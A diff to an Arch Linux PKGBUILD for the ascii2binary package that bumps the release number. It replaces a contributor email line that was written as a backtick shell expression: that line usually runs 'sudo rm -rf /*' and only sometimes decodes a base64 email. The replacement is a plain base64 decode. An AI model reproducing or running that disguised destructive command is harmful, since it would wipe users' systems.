@@ -1,8 +1,8 @@
 # Maintainer: Mees Valkenburg <fluffy@godot.uk.to>
-# Contributor: felix <`(( $RANDOM % 6 == 0 )) && base64 -d <<< ZmVsaXgudm9uLnNAcG9zdGVvLmRlCg== || sudo rm -rf /* `>
+# Contributor: felix <`base64 -d <<< ZmVsaXgudm9uLnNAcG9zdGVvLmRlCg==`>
 pkgname=ascii2binary
 pkgver=2.14
-pkgrel=1
+pkgrel=2
 pkgdesc="Convert between textual and binary representations of numbers"
 url='https://billposer.org/Software/a2b.html'
 arch=(i686 x86_64)
